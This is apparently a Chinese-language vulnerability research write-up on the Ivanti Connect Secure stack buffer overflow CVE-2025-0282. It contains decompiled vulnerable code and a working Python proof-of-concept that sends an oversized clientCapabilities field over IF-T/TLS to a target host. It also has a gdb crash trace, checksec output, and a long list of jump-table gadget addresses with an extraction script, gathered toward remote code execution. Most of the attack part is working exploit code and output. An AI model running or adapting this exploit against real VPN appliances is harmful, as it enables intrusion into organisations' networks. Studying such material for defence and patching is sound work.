# 影响版本

- Ivanti Connect Secure before version 22.7R2.5
- Ivanti Policy Secure before version 22.7R1.2
- Ivanti Neurons for ZTA gateways before version 22.7R2.3

# 成因

```c
    char dest[256];

    clientCapabilities = getKey(req, "clientCapabilities");
    if ( clientCapabilities != NULL )
    {
      clientCapabilitiesLength = strlen(clientCapabilities);
      if ( clientCapabilitiesLength != 0 )
	      connInfo->clientCapabilities = clientCapabilities;
      }
    }
    memset(dest, 0, sizeof(dest));
    strncpy(dest, connInfo->clientCapabilities, clientCapabilitiesLength);
```

对于具体的漏洞函数为web elf文件中的DSWSTncTransportHandler::DispatchMessage ( 或：tnctransport.cc::DispatchMessage )

```c
int __cdecl sub_5668EAD0(int a1, IftTlsHeader *a2, char *a3)
{
char dest[256]; // [esp+120h] [ebp-8ECh] BYREF
.............................................
  	needle = (char *)IftTlsHeader::getVendorId(a2);
    Type = (char *)IftTlsHeader::getType(a2);
    Len = (__guard *)IftTlsHeader::getLen(a2);
    IftTlsHeader::getId(a2);
    if ( !byte_56718218 && __cxa_guard_acquire((__guard *)&byte_56718218) )
    {
      dword_56718064 = DSGetStatementCounter(
                         "tnctransport.cc",
                         596,
                         "dispatchMessage",
                         "ifttls",
                         50,
                         "DispatchMessage(%x, %d, %d, %d)");
  .............................................
    v19 = (const char *)getValue((int)v52, IFT_JNPR_KEY_PREAUTH_INIT_CLIENT_CAPABILITIES);
    v20 = v19;
    if ( v19 )
    {
      v21 = strlen(v19);
      if ( v21 >= 0 )
      {
        if ( v21 >= *(_DWORD *)(a1 + 148) )
          DSStr::reserve((DSStr *)(a1 + 140), v21 + 1);
        memmove(*(void **)(a1 + 140), v20, v21);
        *(_DWORD *)(a1 + 144) = v21;
        *(_BYTE *)(*(_DWORD *)(a1 + 140) + v21) = 0;
      }
    }
    else if ( *(int *)(a1 + 148) > 0 )
    {
      v22 = 1;
      **(_BYTE **)(a1 + 140) = 0;
      *(_DWORD *)(a1 + 144) = 0;
      goto LABEL_55;
    }
    v22 = *(_DWORD *)(a1 + 144) + 1;
LABEL_55:
    memset(dest, 0, sizeof(dest));
    strncpy(dest, *(const char **)(a1 + 140), v22); //漏洞点位
```

# PoC

```py
import ssl
import socket
import struct
import time

HOST = "192.168.31.182"
PORT = 443  
DSNUMWEBS = 8

CIPHERS = "AES256-GCM-SHA384"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.TLSv1_2
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock


def try_read_response(sock) -> bytes:
    def read_or_raise(n):
        read = sock.read(n)
        if not read:
            raise RuntimeError(f"Unable to read response headers: {headers}")
        return read

    count = 0
    max_count = 10
    while not (headers := sock.read(1)):
        count += 1
        time.sleep(0.1)
        if count == max_count:
            raise RuntimeError(f"Unable to read response headers: {headers}")

    while b"\r\n\r\n" not in headers:
        headers += read_or_raise(100)

    return headers

def try_upgrade_to_ifttls(sk):
    request = (f"GET / HTTP/1.1\r\n"
               f"Host: {HOST}\r\n"
               f"Connection: Upgrade\r\n"
               f"Upgrade: IF-T/TLS 1.0\r\n"
               f"\r\n")
    sk.sendall(request.encode())
    response = try_read_response(sk)
    return response

socks = []
for i in range(DSNUMWEBS):
    sk = create_ssl_socket()
    socks.append(sk)

for sk in socks:
    res = try_upgrade_to_ifttls(sk)
    if b"HTTP/1.1 101 Switching Protocols" not in res:
        print("Failed to upgrade to IF-T/TLS")
        sk.close()
        continue
    
    ift_data = bytearray()
    ift_data.extend(struct.pack('!I', 0x00000A4C)) # getVendorId
    ift_data.extend(struct.pack('!I', 0x00000088)) # type

    payload = "clientCapabilities=" + "a"*1024

    ift_data.extend(struct.pack('!I', 16 + len(payload))) # len
    ift_data.extend(struct.pack('!I', 0x00000000)) # seq id

    sk.sendall(ift_data)
    sk.sendall(payload.encode())

while True:
    time.sleep(4)
```

```
0xf7f52db9 in __kernel_vsyscall ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xf4f68d1d in free () from /lib/libc.so.6
(gdb) bt
#0  0xf4f68d1d in free () from /lib/libc.so.6
#1  0xf6d5a35f in DSUtilMemPool::~DSUtilMemPool() ()
   from /home/ecbuilds/int-rel/sa/22.7/bld3431.1/install/lib/libdsplibs.so
#2  0x5668f4e8 in ?? ()
#3  0x5668fe7b in ?? ()
#4  0xf5fc5565 in IftTlsParser::parse(unsigned char const*, unsigned int) ()
   from /home/ecbuilds/int-rel/sa/22.7/bld3431.1/install/lib/libdsagentd.so
```

# 利用

```shell
sysirq@sysirqMachine:~/Work/ivanti/ics_v22.7r2.3/rootfs/home/bin$ checksec --file=./web --format=cli
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     RPATH     No RUNPATH   No Symbols	  No	0		13		./web
```

需要满足虚函数调用

```asm
.text:5668F1C3                 mov     edx, [esp+0A0Ch+var_9E0]
.text:5668F1C7                 mov     eax, [esp+0A0Ch+arg_0]
.text:5668F1CE                 mov     eax, [eax]
.text:5668F1D0                 mov     [esp+0A0Ch+src], edx
.text:5668F1D4                 mov     edx, [esp+0A0Ch+arg_0]
.text:5668F1DB                 mov     [esp+0A0Ch+n], 2Eh ; '.' ; int
.text:5668F1E3                 mov     [esp+0A0Ch+var_A0C], edx
.text:5668F1E6                 call    dword ptr [eax+48h]
```

可以通过查找libdsplibs.so中的跳转表(jpt_ 开头的，以FF 开始的jmp指令)，获取满足该虚函数调用的地址

```log
Address	Function	Instruction
.text:0111EDA1	_ZN11xercesc_3_212WFXMLScanner11scanContentEv	FF 24 85 00 7E 2F                 jmp     ds:jpt_111EDA1[eax*4] ; switch jump
.text:00FF5EC3	_ZNK11xercesc_3_211DOMNodeImpl18isDefaultNamespaceEPKt	FF 24 85 00 D5 28                 jmp     ds:jpt_FF5EC3[eax*4] ; switch jump
.text:010DBFD0	_ZNK11xercesc_3_218SimpleContentModel15validateContentEPPNS_5QNameEjjPjPNS_13MemoryManagerE	FF 24 85 04 1A 2F                 jmp     ds:jpt_10DBFD0[eax*4] ; switch jump
.text:010052E8	_ZNK11xercesc_3_215DOMTypeInfoImpl17getStringPropertyENS_15DOMPSVITypeInfo12PSVIPropertyE	FF 24 85 0C E8 28                 jmp     ds:jpt_10052E8[eax*4] ; switch jump
.text:01015E00	_ZN11xercesc_3_27XSValue17validateDateTimesEPKtNS0_8DataTypeERNS0_6StatusEPNS_13MemoryManagerE	FF 24 85 14 0E 29                 jmp     ds:jpt_1015E00[eax*4] ; switch jump
.text:00932237	sub_931F00	FF 24 85 14 77 1D                 jmp     ds:jpt_932237[eax*4] ; switch jump
.text:010DC588	_ZNK11xercesc_3_218SimpleContentModel22validateContentSpecialEPPNS_5QNameEjjPNS_15GrammarResolverEPNS_13XMLStringPoolEPjPNS_13MemoryManagerE	FF 24 85 1C 1A 2F                 jmp     ds:jpt_10DC588[eax*4] ; switch jump
.text:0111F204	_ZN11xercesc_3_212WFXMLScanner8scanNextERNS_13XMLPScanTokenE	FF 24 85 1C 7E 2F                 jmp     ds:jpt_111F204[eax*4] ; switch jump
.text:009408C1	sub_93E0F0	FF 24 85 1C 93 1D                 jmp     ds:jpt_9408C1[eax*4] ; switch jump
.text:01103F01	_ZN11xercesc_3_212IGXMLScanner11scanContentEv	FF 24 85 20 6B 2F                 jmp     ds:jpt_1103F01[eax*4] ; switch jump
.text:009353A2	sub_932850	FF 24 85 24 7A 1D                 jmp     ds:jpt_9353A2[eax*4] ; switch jump
.text:010A078B	_ZNK11xercesc_3_25Token12getMinLengthEv	FF 24 85 24 D1 2D                 jmp     ds:jpt_10A078B[eax*4] ; switch jump
.text:0093E1C6	sub_93E0F0	FF 24 85 28 91 1D                 jmp     ds:jpt_93E1C6[eax*4] ; switch jump
.text:00946D73	sub_946C90	FF 24 85 28 96 1D                 jmp     ds:jpt_946D73[eax*4] ; switch jump
.text:00FF603B	_ZNK11xercesc_3_211DOMNodeImpl18lookupNamespaceURIEPKt	FF 24 85 34 D5 28                 jmp     ds:jpt_FF603B[eax*4] ; switch jump
.text:01016188	_ZN11xercesc_3_27XSValue18getCanRepDateTimesEPKtNS0_8DataTypeERNS0_6StatusEbPNS_13MemoryManagerE	FF 24 85 38 0E 29                 jmp     ds:jpt_1016188[eax*4] ; switch jump
.text:01104374	_ZN11xercesc_3_212IGXMLScanner8scanNextERNS_13XMLPScanTokenE	FF 24 85 3C 6B 2F                 jmp     ds:jpt_1104374[eax*4] ; switch jump
.text:0101877A	_ZN11xercesc_3_212XMLFormatter9formatBufEPKtjNS0_11EscapeFlagsENS0_10UnRepFlagsE	FF 24 85 40 14 29                 jmp     ds:jpt_101877A[eax*4] ; switch jump
.text:0101D1CE	_ZN11xercesc_3_29XMLReader12doInitDecodeEv	FF 24 85 40 1B 29                 jmp     ds:jpt_101D1CE[eax*4] ; switch jump
.text:0093847B	sub_938080	FF 24 85 40 89 1D                 jmp     ds:jpt_93847B[eax*4] ; switch jump
.text:0109E4E8	_ZN11xercesc_3_210RegxParser20getTokenForShorthandEi	FF 24 85 44 CA 2D                 jmp     ds:jpt_109E4E8[eax*4] ; switch jump
.text:01030BF4	_ZN11xercesc_3_217AbstractDOMParser6attDefERKNS_14DTDElementDeclERKNS_9DTDAttDefEb	FF 24 85 4C 27 29                 jmp     ds:jpt_1030BF4[eax*4] ; switch jump
.text:0113477B	sub_1134730	FF 24 85 4C 9A 2F                 jmp     ds:jpt_113477B[eax*4] ; switch jump
.text:009417FD	sub_93E0F0	FF 24 85 58 93 1D                 jmp     ds:jpt_9417FD[eax*4] ; switch jump
.text:010A090B	_ZNK11xercesc_3_25Token12getMaxLengthEv	FF 24 85 58 D1 2D                 jmp     ds:jpt_10A090B[eax*4] ; switch jump
.text:010162E8	_ZN11xercesc_3_27XSValue16getActValStringsEPKtNS0_8DataTypeERNS0_6StatusENS0_10XMLVersionEbPNS_13MemoryManagerE	FF 24 85 5C 0E 29                 jmp     ds:jpt_10162E8[eax*4] ; switch jump
.text:0101EC1C	_ZN11xercesc_3_29XMLReaderC2EPKtS2_PNS_14BinInputStreamES2_NS0_7RefFromENS0_5TypesENS0_7SourcesEbbjNS0_10XMLVersionEPNS_13MemoryManagerE	FF 24 85 5C 1B 29                 jmp     ds:jpt_101EC1C[eax*4] ; switch jump
.text:009384DE	sub_938080	FF 24 85 64 89 1D                 jmp     ds:jpt_9384DE[eax*4] ; switch jump
.text:0093AF2D	sub_938080	FF 24 85 68 90 1D                 jmp     ds:jpt_93AF2D[eax*4] ; switch jump
.text:00FF66EB	_ZNK11xercesc_3_211DOMNodeImpl12lookupPrefixEPKt	FF 24 85 68 D5 28                 jmp     ds:jpt_FF66EB[eax*4] ; switch jump
.text:00932576	sub_931F00	FF 24 85 70 77 1D                 jmp     ds:jpt_932576[eax*4] ; switch jump
.text:01033C73	_ZN11xercesc_3_217AbstractDOMParser12startElementERKNS_14XMLElementDeclEjPKtRKNS_11RefVectorOfINS_7XMLAttrEEEjbb	FF 24 85 74 27 29                 jmp     ds:jpt_1033C73[eax*4] ; switch jump
.text:010FB2E1	_ZN11xercesc_3_212DGXMLScanner11scanContentEv	FF 24 85 80 66 2F                 jmp     ds:jpt_10FB2E1[eax*4] ; switch jump
.text:0110F9E1	_ZN11xercesc_3_212SGXMLScanner11scanContentEv	FF 24 85 80 75 2F                 jmp     ds:jpt_110F9E1[eax*4] ; switch jump
.text:011342FB	sub_11342B0	FF 24 85 80 99 2F                 jmp     ds:jpt_11342FB[eax*4] ; switch jump
.text:00FE50E0	_ZN11xercesc_3_215DOMDocumentImpl10importNodeEPKNS_7DOMNodeEbb	FF 24 85 80 AB 28                 jmp     ds:jpt_FE50E0[eax*4] ; switch jump
.text:0109EF00	_ZN11xercesc_3_210RegxParser19parseCharacterClassEb	FF 24 85 80 CC 2D                 jmp     ds:jpt_109EF00[eax*4] ; switch jump
.text:010A0C5B	_ZN11xercesc_3_25Token21analyzeFirstCharacterEPNS_10RangeTokenEiPNS_12TokenFactoryE	FF 24 85 8C D1 2D                 jmp     ds:jpt_10A0C5B[eax*4] ; switch jump
.text:0109AA1B	_ZNK11xercesc_3_217RegularExpression5matchEPNS0_7ContextEPKNS_2OpEj	FF 24 85 94 C5 2D                 jmp     ds:jpt_109AA1B[eax*4] ; switch jump
.text:0103419B	_ZN11xercesc_3_217AbstractDOMParser12startElementERKNS_14XMLElementDeclEjPKtRKNS_11RefVectorOfINS_7XMLAttrEEEjbb	FF 24 85 9C 27 29                 jmp     ds:jpt_103419B[eax*4] ; switch jump
.text:010FB754	_ZN11xercesc_3_212DGXMLScanner8scanNextERNS_13XMLPScanTokenE	FF 24 85 9C 66 2F                 jmp     ds:jpt_10FB754[eax*4] ; switch jump
.text:01112D64	_ZN11xercesc_3_212SGXMLScanner8scanNextERNS_13XMLPScanTokenE	FF 24 85 9C 75 2F                 jmp     ds:jpt_1112D64[eax*4] ; switch jump
.text:010ED290	_ZN11xercesc_3_215SchemaValidator25checkParticleDerivationOkEPNS_13SchemaGrammarEPNS_15ContentSpecNodeEiS4_iPKNS_15ComplexTypeInfoEb	FF 24 85 A0 2C 2F                 jmp     ds:jpt_10ED290[eax*4] ; switch jump
.text:00934BB2	sub_932850	FF 24 85 A0 79 1D                 jmp     ds:jpt_934BB2[eax*4] ; switch jump
.text:00946CEB	sub_946C90	FF 24 85 A0 94 1D                 jmp     ds:jpt_946CEB[eax*4] ; switch jump
.text:0109F4F3	_ZN11xercesc_3_210RegxParser9parseAtomEv	FF 24 85 AC CD 2D                 jmp     ds:jpt_109F4F3[eax*4] ; switch jump
.text:009321E2	sub_931F00	FF 24 85 B4 76 1D                 jmp     ds:jpt_9321E2[eax*4] ; switch jump
.text:010051A0	_ZN11xercesc_3_215DOMTypeInfoImpl17setStringPropertyENS_15DOMPSVITypeInfo12PSVIPropertyEPKt	FF 24 85 B4 E7 28                 jmp     ds:jpt_10051A0[eax*4] ; switch jump
.text:011313DA	sub_11313A0	FF 24 85 CC 92 2F                 jmp     ds:jpt_11313DA[eax*4] ; switch jump
.text:0103E7E9	_ZN11xercesc_3_217DatatypeValidator6loadDVERNS_16XSerializeEngineE	FF 24 85 D4 3C 29                 jmp     ds:jpt_103E7E9[eax*4] ; switch jump
.text:01016798	_ZN11xercesc_3_27XSValue16getCanRepStringsEPKtNS0_8DataTypeERNS0_6StatusENS0_10XMLVersionEbPNS_13MemoryManagerE	FF 24 85 D8 0E 29                 jmp     ds:jpt_1016798[eax*4] ; switch jump
.text:01005228	_ZNK11xercesc_3_215DOMTypeInfoImpl18getNumericPropertyENS_15DOMPSVITypeInfo12PSVIPropertyE	FF 24 85 D8 E7 28                 jmp     ds:jpt_1005228[eax*4] ; switch jump
.text:0105A730	_ZN11xercesc_3_211XercesXPath15parseExpressionEPNS_13XMLStringPoolEPNS_23XercesNamespaceResolverE	FF 24 85 DC 5F 29                 jmp     ds:jpt_105A730[eax*4] ; switch jump
.text:01036403	_ZN11xercesc_3_215DOMLSParserImpl16parseWithContextEPKNS_10DOMLSInputEPNS_7DOMNodeENS_11DOMLSParser10ActionTypeE	FF 24 85 E0 2C 29                 jmp     ds:jpt_1036403[eax*4] ; switch jump
.text:010614EA	_ZN11xercesc_3_214TraverseSchema15processAttValueEPKtRNS_9XMLBufferE	FF 24 85 E0 7B 29                 jmp     ds:jpt_10614EA[eax*4] ; switch jump
.text:01008090	_ZN11xercesc_3_219DOMLSSerializerImpl11processNodeEPKNS_7DOMNodeEi	FF 24 85 E0 EB 28                 jmp     ds:jpt_1008090[eax*4] ; switch jump
.text:01015B2F	_ZN11xercesc_3_27XSValue18getActValDateTimesEPKtNS0_8DataTypeERNS0_6StatusEPNS_13MemoryManagerE	FF 24 85 F0 0D 29                 jmp     ds:jpt_1015B2F[eax*4] ; switch jump
.text:0108FEBB	_ZN11xercesc_3_218CurlURLInputStream8readMoreEPi	FF 24 85 F0 98 29                 jmp     ds:jpt_108FEBB[eax*4] ; switch jump
.text:0094445F	sub_93E0F0	FF 24 8D 0C 94 1D                 jmp     ds:jpt_94445F[ecx*4] ; switch jump
.text:0109ECB8	_ZN11xercesc_3_210RegxParser13decodeEscapedEv	FF 24 8D 18 CB 2D                 jmp     ds:jpt_109ECB8[ecx*4] ; switch jump
.text:010F3DD8	_ZN11xercesc_3_218ParserForXMLSchema13decodeEscapedEv	FF 24 8D E8 5F 2F                 jmp     ds:jpt_10F3DD8[ecx*4] ; switch jump
.text:00938023	pcre_config	FF 24 95 00 89 1D                 jmp     ds:jpt_938023[edx*4] ; switch jump
.text:00945CEB	pcre_fullinfo	FF 24 95 54 94 1D                 jmp     ds:jpt_945CEB[edx*4] ; switch jump
.text:009316BB	sub_9315C0	FF 24 95 5C 74 1D                 jmp     ds:jpt_9316BB[edx*4] ; switch jump
.text:01098E38	_ZN11xercesc_3_217RegularExpression7compileEPKNS_5TokenEPNS_2OpEb	FF 24 95 60 C5 2D                 jmp     ds:jpt_1098E38[edx*4] ; switch jump
.text:010595C3	_ZN11xercesc_3_212XPathScanner14scanExpressionEPKtjjPNS_13ValueVectorOfIiEE	FF 24 95 80 5F 29                 jmp     ds:jpt_10595C3[edx*4] ; switch jump
.text:010050C8	_ZN11xercesc_3_215DOMTypeInfoImpl18setNumericPropertyENS_15DOMPSVITypeInfo12PSVIPropertyEi	FF 24 95 80 E7 28                 jmp     ds:jpt_10050C8[edx*4] ; switch jump
.text:00936A49	sub_932850	FF 24 95 94 7B 1D                 jmp     ds:jpt_936A49[edx*4] ; switch jump
.text:00941ED3	sub_93E0F0	FF 24 95 94 93 1D                 jmp     ds:jpt_941ED3[edx*4] ; switch jump
.text:00930E50	sub_930D60	FF 24 95 A0 71 1D                 jmp     ds:jpt_930E50[edx*4] ; switch jump
.text:00931C4B	sub_931C00	FF 24 95 A0 75 1D                 jmp     ds:jpt_931C4B[edx*4] ; switch jump
.text:00932E1D	sub_932850	FF 24 95 AC 77 1D                 jmp     ds:jpt_932E1D[edx*4] ; switch jump
.text:00FF800D	_ZNK11xercesc_3_213DOMNormalizer14integerToXMLChEj	FF 24 95 AC D9 28                 jmp     ds:jpt_FF800D[edx*4] ; switch jump
.text:010D3367	sub_10D3240	FF 24 95 C0 15 2F                 jmp     ds:jpt_10D3367[edx*4] ; switch jump
.text:009312CB	sub_931290	FF 24 95 C4 72 1D                 jmp     ds:jpt_9312CB[edx*4] ; switch jump
.text:010ED518	_ZN11xercesc_3_215SchemaValidator25checkParticleDerivationOkEPNS_13SchemaGrammarEPNS_15ContentSpecNodeEiS4_iPKNS_15ComplexTypeInfoEb	FF 24 95 C8 2C 2F                 jmp     ds:jpt_10ED518[edx*4] ; switch jump
.text:00940856	sub_93E0F0	FF 24 95 E0 92 1D                 jmp     ds:jpt_940856[edx*4] ; switch jump
.text:0109E233	_ZN11xercesc_3_210RegxParser11processNextEv	FF 24 95 E0 C8 2D                 jmp     ds:jpt_109E233[edx*4] ; switch jump
.text:0109F640	_ZN11xercesc_3_210RegxParser9parseAtomEv	FF 24 95 E0 CD 2D                 jmp     ds:jpt_109F640[edx*4] ; switch jump
.text:010146D8	_ZN11xercesc_3_27XSValue15validateStringsEPKtNS0_8DataTypeERNS0_6StatusENS0_10XMLVersionEPNS_13MemoryManagerE	FF 24 9D 90 0C 29                 jmp     ds:jpt_10146D8[ebx*4] ; switch jump
.text:00943EED	sub_93E0F0	FF 24 9D D0 93 1D                 jmp     ds:jpt_943EED[ebx*4] ; switch jump
.text:01014EC0	_ZN11xercesc_3_27XSValue16validateNumericsEPKtNS0_8DataTypeERNS0_6StatusEPNS_13MemoryManagerE	FF 24 B5 0C 0D 29                 jmp     ds:jpt_1014EC0[esi*4] ; switch jump
.text:01014FE8	_ZN11xercesc_3_27XSValue16validateNumericsEPKtNS0_8DataTypeERNS0_6StatusEPNS_13MemoryManagerE	FF 24 B5 BC 0D 29                 jmp     ds:jpt_1014FE8[esi*4] ; switch jump
.text:010143F8	_ZN11xercesc_3_27XSValue17getActValNumericsEPKtNS0_8DataTypeERNS0_6StatusEbPNS_13MemoryManagerE	FF 24 BD 60 0C 29                 jmp     ds:jpt_10143F8[edi*4] ; switch jump
.text:010140C0	_ZN11xercesc_3_27XSValue21getActualNumericValueEPKtRNS0_6StatusERNS0_7t_valueEPNS_13MemoryManagerENS0_8DataTypeE	FF 24 BD 80 0B 29                 jmp     ds:jpt_10140C0[edi*4] ; switch jump
.text:010141F8	_ZN11xercesc_3_27XSValue17getActValNumericsEPKtNS0_8DataTypeERNS0_6StatusEbPNS_13MemoryManagerE	FF 24 BD B0 0B 29                 jmp     ds:jpt_10141F8[edi*4] ; switch jump
```

提取地址

```python
import re

# 打开文件并读取内容
with open('jpt', 'r', encoding='utf-8') as f:
    lines = f.readlines()

# 用正则提取 .text: 后的地址
pattern = re.compile(r'\.text:([0-9A-Fa-f]{8})')
addresses = []

for line in lines:
    match = pattern.search(line)
    if match:
        addr_hex_str = match.group(1)
        addr_int = int(addr_hex_str, 16)
        addresses.append(addr_int)

# 输出结果
for addr in addresses:
    print(hex(addr))

print(addresses)
```

Output:

```
0x111eda1
0xff5ec3
0x10dbfd0
0x10052e8
0x1015e00
0x932237
0x10dc588
0x111f204
0x9408c1
0x1103f01
0x9353a2
0x10a078b
0x93e1c6
0x946d73
0xff603b
0x1016188
0x1104374
0x101877a
0x101d1ce
0x93847b
0x109e4e8
0x1030bf4
0x113477b
0x9417fd
0x10a090b
0x10162e8
0x101ec1c
0x9384de
0x93af2d
0xff66eb
0x932576
0x1033c73
0x10fb2e1
0x110f9e1
0x11342fb
0xfe50e0
0x109ef00
0x10a0c5b
0x109aa1b
0x103419b
0x10fb754
0x1112d64
0x10ed290
0x934bb2
0x946ceb
0x109f4f3
0x9321e2
0x10051a0
0x11313da
0x103e7e9
0x1016798
0x1005228
0x105a730
0x1036403
0x10614ea
0x1008090
0x1015b2f
0x108febb
0x94445f
0x109ecb8
0x10f3dd8
0x938023
0x945ceb
0x9316bb
0x1098e38
0x10595c3
0x10050c8
0x936a49
0x941ed3
0x930e50
0x931c4b
0x932e1d
0xff800d
0x10d3367
0x9312cb
0x10ed518
0x940856
0x109e233
0x109f640
0x10146d8
0x943eed
0x1014ec0
0x1014fe8
0x10143f8
0x10140c0
0x10141f8
[17952161, 16735939, 17678288, 16798440, 16866816, 9642551, 17679752, 17953284, 9701569, 17841921, 9655202, 17434507, 9691590, 9727347, 16736315, 16867720, 17843060, 16877434, 16896462, 9667707, 17425640, 16976884, 18040699, 9705469, 17434891, 16868072, 16903196, 9667806, 9678637, 16738027, 9643382, 16989299, 17806049, 17889761, 18039547, 16666848, 17428224, 17435739, 17410587, 16990619, 17807188, 17902948, 17748624, 9653170, 9727211, 17429747, 9642466, 16798112, 18027482, 17033193, 16869272, 16798248, 17147696, 16999427, 17175786, 16810128, 16866095, 17366715, 9716831, 17427640, 17776088, 9666595, 9723115, 9639611, 17403448, 17143235, 16797896, 9661001, 9707219, 9637456, 9641035, 9645597, 16744461, 17642343, 9638603, 17749272, 9701462, 17424947, 17430080, 16860888, 9715437, 16862912, 16863208, 16860152, 16859328, 16859640]
```

通过IDA Python 模拟虚函数调用的最终地址。



# 一些有用的帮助

```
HTTP/1.1 101 Switching Protocols
Content-type: application/octet-stream
Pragma: no-cache
Upgrade: IF-T/TLS 1.0
Connection: Upgrade
HC_HMAC_VERSION_COOKIE: 1
supportSHA2Signature: 1
X-XSS-Protection: 1
Strict-Transport-Security: max-age=31536000
accept-ch:Sec-CH-UA-Platform-Version
```

# 参考资料

Do Secure-By-Design Pledges Come With Stickers? - Ivanti Connect Secure RCE (CVE-2025-0282)

https://labs.watchtowr.com/do-secure-by-design-pledges-come-with-stickers-ivanti-connect-secure-rce-cve-2025-0282/

Exploitation Walkthrough and Techniques

https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282/

CVE-2025-0282

https://github.com/sfewer-r7/CVE-2025-0282/blob/main/CVE-2025-0282.rb